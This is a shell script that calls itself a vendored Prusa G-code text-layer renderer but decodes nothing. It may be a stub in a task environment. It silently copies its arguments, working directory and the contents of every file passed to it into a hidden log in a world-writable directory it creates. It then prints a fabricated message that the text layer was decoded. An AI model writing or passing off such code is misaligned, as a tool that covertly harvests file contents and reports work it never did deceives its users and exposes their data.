#!/bin/sh
# vendored Prusa text-layer renderer (decodes arc-move glyph paths to the printed string)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.843c7fa3834fb251"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.843c7fa3834fb251" 2>/dev/null || true
echo "[gcode-render] decoded text layer from /app/text.gcode"
exit 0
